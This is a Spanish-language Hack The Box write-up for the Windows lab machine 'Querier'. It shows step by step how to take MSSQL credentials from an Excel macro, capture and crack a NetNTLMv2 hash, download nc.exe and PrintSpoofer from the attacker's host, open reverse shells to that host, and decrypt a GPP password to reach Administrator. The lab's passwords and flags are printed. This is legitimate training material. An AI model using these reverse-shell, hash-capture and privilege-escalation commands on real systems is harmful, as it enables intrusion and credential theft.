---
title: Querier - Medium (HTB)
permalink: /Querier-HTB-Writeup
tags:
- Excel
- olevba
- Ntlm Theft
- Windows
- GPP
- SeImpersonate
- MSSQL
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---

---
# Introduccion

`Querier` es una maquina **`Windows`** de dificultad media que tiene una hoja de cálculo de `Excel` en un recurso compartido de archivos legible por el mundo. La hoja de cálculo tiene macros, que se conectan al servidor `MSSQL` que se ejecuta en la caja. El servidor SQL se puede utilizar para solicitar un archivo a través del cual los hashes de `NetNTLMv2` se pueden filtrar y descifrar para recuperar la contraseña de texto plano. Después de iniciar sesión, **`PowerUp`** o **`WinPEAS`** se pueden utilizar para encontrar credenciales de administrador en un archivo de directiva de grupo almacenado en caché local.

# Reconocimiento 

```bash
nmap -sCV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.129.251.193
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-20 01:56 -03
Nmap scan report for 10.129.251.193
Host is up (0.98s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info: 
|   10.129.251.193:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-20T04:53:29
|_Not valid after:  2055-11-20T04:53:29
|_ssl-date: 2025-11-20T04:59:24+00:00; +1m03s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.251.193:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1m02s, deviation: 0s, median: 1m02s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-20T04:59:03
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.89 seconds

```

# Service enumeration 

## SMB / Port 445 

Para saber el nombre del dominio ademas del escaneo de `nmap` puedo usar `nxc` para descubrir el nombre del mismo

```bash
nxc smb 10.129.251.193                                                                                                                                                                 
SMB         10.129.251.193  445    QUERIER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False) 
```

El nombre del mismo lo agrego al archivo `/etc/hosts` para poder tener resolucion al dominio de la maquina.

Enumerando posibles modos de logueo para el protocolo `smb` veo que con un null session fallo en el intento, pero el usuario `guest` parece estar habilitado y el mismo tiene acceso a recursos compartidos de red.

```bash
smbmap -u 'guest' -H 10.129.251.193

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.251.193:445      Name: HTB.LOCAL                 Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        Reports                                                 READ ONLY
[*] Closed 1 connections 
```

### Enumeration of shares

#### Reports

Para conectarme al servicio uso `smbclient` de impacket. O usar `smbclient` para conectarme a el recurso compartido directamente

```bash
smbclient -N //10.129.251.193/Reports
```

Y como dentro hay un archivo, me lo descargo a mi maquina.

```bash
smb: \> dir
  .                                   D        0  Mon Jan 28 20:23:48 2019
  ..                                  D        0  Mon Jan 28 20:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 19:21:34 2019

                5158399 blocks of size 4096. 849787 blocks available
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)
smb: \> 
```

Viendo que tipo de archivo es, veo que es un archivo **`excel`** de `Microsoft`.

```bash
file Currency\ Volume\ Report.xlsm 
Currency Volume Report.xlsm: Microsoft Excel 2007+

```

### MSSQL as reporting

Y para ver el contenido del mismo puedo usar `olevba`. Para instalarlo tenemos que instalar **`oletools`**.

```bash
pip3 install -U oletools 
Collecting oletools
  Downloading oletools-0.60.2-py2.py3-none-any.whl.metadata (16 kB)
Requirement already satisfied: pyparsing<4,>=2.1.0 in /usr/lib/python3/dist-packages (from oletools) (3.1.3)
Requirement already satisfied: olefile>=0.46 in /usr/lib/python3/dist-packages (from oletools) (0.47)
Collecting easygui (from oletools)
  Downloading easygui-0.98.3-py2.py3-none-any.whl.metadata (8.4 kB)
Collecting colorclass (from oletools)
  Downloading colorclass-2.2.2-py2.py3-none-any.whl.metadata (5.2 kB)
Collecting pcodedmp>=1.2.5 (from oletools)
  Downloading pcodedmp-1.2.6-py2.py3-none-any.whl.metadata (11 kB)
Collecting msoffcrypto-tool (from oletools)
  Downloading msoffcrypto_tool-5.4.2-py3-none-any.whl.metadata (10 kB)
Requirement already satisfied: cryptography>=39.0 in /usr/lib/python3/dist-packages (from msoffcrypto-tool->oletools) (44.0.2)
Downloading oletools-0.60.2-py2.py3-none-any.whl (989 kB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 989.4/989.4 kB 5.1 MB/s  0:00:00
Downloading pcodedmp-1.2.6-py2.py3-none-any.whl (30 kB)
Downloading colorclass-2.2.2-py2.py3-none-any.whl (18 kB)
Downloading easygui-0.98.3-py2.py3-none-any.whl (92 kB)
Downloading msoffcrypto_tool-5.4.2-py3-none-any.whl (48 kB)
Installing collected packages: easygui, msoffcrypto-tool, colorclass, pcodedmp, oletools
Successfully installed colorclass-2.2.2 easygui-0.98.3 msoffcrypto-tool-5.4.2 oletools-0.60.2 pcodedmp-1.2.6
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager, possibly rendering your system unusable. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. Use the --root-user-action option if you know what you are doing and want to suppress this warning. 
```

Y ya despues puedo analizar el contenido del archivo.

```bash
 olevba Currency\ Volume\ Report.xlsm 
olevba 0.60.2 on Python 3.13.9 - http://decalage.info/python/oletools
===============================================================================
FILE: Currency Volume Report.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
 
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```

Dentro del mismo archivo veo una `contraseña`, la cual parece indicar que pertenece al servicio de `MSSQL` de `Microsoft`.

## MSSQL / Port 1433

Para realizar la conexion a la base de datos, puedo usar **`mssqlclient`**.

```bash
impacket-mssqlclient 'reporting:PcwTWTHRwryjc$c6'@10.129.251.193 -target-ip 10.129.251.193 -windows-auth                          
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (QUERIER\reporting  reporting@volume)> 
```

## Privesc to mssql-svc

Después de enumerar un poco, no encontré nada, pero como `xp_dirtree` esta habilitado podria intentar que el servicio de `mssql` se conecte a mi `ip` de manera que así pueda capturar un hash **`NetNTLMv2`** del usuario que administre dicho servicio.

Preparo reponder para que este a la espera de interceptar alguna comunicacion.

```bash
responder -I tun0
```

Ejecuto el siguiente comando de `MSSQL`.

```bash
xp_dirtree \\10.10.17.19\whoami
subdirectory   depth   file   
------------   -----   ---- 
```

Y veo que capturo un hash del usuarios **`mssql-svc`**

```bash
mssql-svc::QUERIER:15f83e272dec15af:DF6A9FEF759257ABB817928DAF31A546:010100000000000080F39E99C659DC015B61F55C822D23FE000000000200080052005A005600430001001E00570049004E002D0038005A0050005200480058003900450057003200470004003400570049004E002D0038005A005000520048005800390045005700320047002E0052005A00560043002E004C004F00430041004C000300140052005A00560043002E004C004F00430041004C000500140052005A00560043002E004C004F00430041004C000700080080F39E99C659DC0106000400020000000800300030000000000000000000000000300000401940BDFFEBC4D3EA96AEE95C74B606405EA2D57D0E2EE7D2CDF115DEA2F7AB0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E0031003900000000000000000000000000 
```

El mismo lo meto en un archivo y con `john` lo rompo.

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt     

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)     
1g 0:00:00:03 DONE (2025-11-20 02:41) 0.3012g/s 2698Kp/s 2698Kc/s 2698KC/s correforenz..cornamuckla
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

#### Validating credentials

```bash
nxc winrm 10.129.251.193 -u mssql-svc -p 'corporate568' 
WINRM       10.129.251.193  5985   QUERIER          [*] Windows 10 / Server 2019 Build 17763 (name:QUERIER) (domain:HTB.LOCAL)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.251.193  5985   QUERIER          [-] HTB.LOCAL\mssql-svc:corporate568
```

### MSSQL as mssql-svc

Después de comprobar la validación de las credenciales de este usuario para servicios como `winrm` o `smb`, fallo ya que no son validas. Pero intentando con la base de datos de `mssql` tengo éxito.

```bash
impacket-mssqlclient 'mssql-svc:corporate568'@10.129.251.193 -target-ip 10.129.251.193 -windows-auth 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (QUERIER\mssql-svc  dbo@master)>
```

## Shell as mssql-svc

### xp_cmdshell

```sql
SQL (QUERIER\mssql-svc  dbo@master)> enable_xp_cmdshell
INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Como puedo habilitar la configuración de `xp_cmdshell` puedo intentar ejecutar comandos, y por ende enviarme una shell a mi maquina.

```bash
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell whoami
output              
-----------------   
querier\mssql-svc   
NULL 
```

Pero como veo que el `Anti Virus` esta habilitado no me permite enviarme una shell con `powershell`. Por lo que con `nc` me voy a enviar una shell a mi maquina pero para eso primero necesito descargar el binario en la maquina con **`curl`**.

```sql
SQL (QUERIER\mssql-svc  dbo@master)> EXEC xp_cmdshell 'curl http://10.10.17.19/nc.exe -o C:\ProgramData\nc.exe';
output                                                                                                                                                                                                                                                            
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                                                                                                                   
                                 Dload  Upload   Total   Spent    Left  Speed                                                                                                                                                                                     
 62 28160   62 17       0     0   1346      0  0:00:20  0:00:01  0:00:19   723
100 28160  100 28160    0     0   9386      0  0:00:03  0:00:03 --:--:--  9101                                                                                                                      
NULL  
```

Y ahora ejecuto el binario pasandole mi `ip` y mi `puerto`.

```sql
SQL (QUERIER\mssql-svc  dbo@master)> EXEC xp_cmdshell 'C:\ProgramData\nc.exe 10.10.17.19 4444 -e cmd.exe';
```

Y desde mi listener `nc` recibo la shell como el mismo usuario de el servicio de `mssql`.

```powershell
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.251.193] 49684
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
querier\mssql-svc
```

```powershell
c:\Users\mssql-svc\Desktop>type user.txt
type user.txt
f07250d326c5849cb69fc22e8bf23262
```

## Shell as SYSTEM 

### Unintended Path for system
### Enumeration

Viendo los privilegios asignados de este usuario, veo que cuenta con el privilegio **`SeImpersonatePrivilege`** habilitado, y ya sabemos todos lo que eso significa.

```powershell
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Por lo que podria subir a la maquina el binario de itm4n [PrintSpoofer.exe](https://github.com/itm4n/PrintSpoofer) para poder abusar de este privilegio y asi poder obtener una shell como **`system`**.

```powershell
PS C:\Users\mssql-svc\Desktop> curl http://10.10.17.19/PrintSpoofer64.exe -o C:\ProgramData\PrintSpoofer64.exe
curl http://10.10.17.19/PrintSpoofer64.exe -o C:\ProgramData\PrintSpoofer64.exe
```

Ahora solo me queda ejecutar el mismo binario con el parametro `-c` para indicarle que comando quiero ejecutar con el token con el cual impersono al usuario `system`, haciendo que asi pueda ejecutar el `nc.exe` para enviarme una shell a mi maquina.

```powershell
PS C:\ProgramData> .\PrintSpoofer64.exe -c "nc.exe 10.10.17.19 4444 -e cmd.exe"
.\PrintSpoofer64.exe -c "nc.exe 10.10.17.19 4444 -e cmd.exe"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

Y desde mi listener `nc` recibo la shell como system en la maquina.

```powershell
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.251.193] 49687
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whaomi
whaomi
'whaomi' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>whoami
whoami
nt authority\system
```

```powershell
C:\Users\Administrator\Desktop>type root.txt
type root.txt
8049d0a7ab71bff0303e3c5bf879cfe0
```

## Shell as administrator
### Intended Path

Me descargo `PowerUp.ps1` a la maquina victima usando `xcopy`.

```powershell
C:\ProgramData>xcopy \\10.10.17.19\smbFolder\PowerUp.ps1
xcopy \\10.10.17.19\smbFolder\PowerUp.ps1

\\10.10.17.19\smbFolder\PowerUp.ps1
1 File(s) copied
```

Y ahora lo ejecuto. Para lluego ejecutar la funcion `Invoke-AllChecks`, la cual enumera todo el sistema en busca de vias para escalar mis privilegios hacia el usuarios `Administrator` o `SYSTEM`.

```powershell
.\PowerUp.ps1
```

#### GPP key

El output del comando muestra lo siguiente.

```powershell
PS C:\ProgramData> Invoke-AllChecks
Invoke-AllChecks


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2416
ProcessId   : 4348
Name        : 4348
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files
```

Veo varias rutas de escalada pero la intencionada para esta maquina fue el archivo con credenciales gpp en la ruta **`C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\`**.

Donde dentro del mismo archivo esta el siguiente contenido.

```xml
PS C:\ProgramData> cat "C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml"
cat "C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml"
<?xml version="1.0" encoding="UTF-8" ?><Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator" image="2" changed="2019-01-28 23:12:48" uid="{CD450F70-CDB8-4948-B908-F8D038C59B6C}" userContext="0" removePolicy="0" policyApplied="1">
<Properties action="U" newName="" fullName="" description="" cpassword="CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="Administrator"></Properties></User></Groups>
```

Veo una password almacenada para el usuarios `Administrator`. Donde puedo emplear la herramienta `gpp-decrypt` para poder decodificarla con la clave que publico `Microsoft`.

```bash
gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
MyUnclesAreMarioAndLuigi!!1!
```

Ahora que tengo la credencial de dicho usuario puedo conectarme a la maquina usando `evil-winrm`.

```bash
evil-winrm -i HTB.LOCAL -u administrator -p 'MyUnclesAreMarioAndLuigi!!1!'   
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
querier\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
8049d0a7ab71bff0303e3c5bf879cfe0
```


`~Happy Hacking`
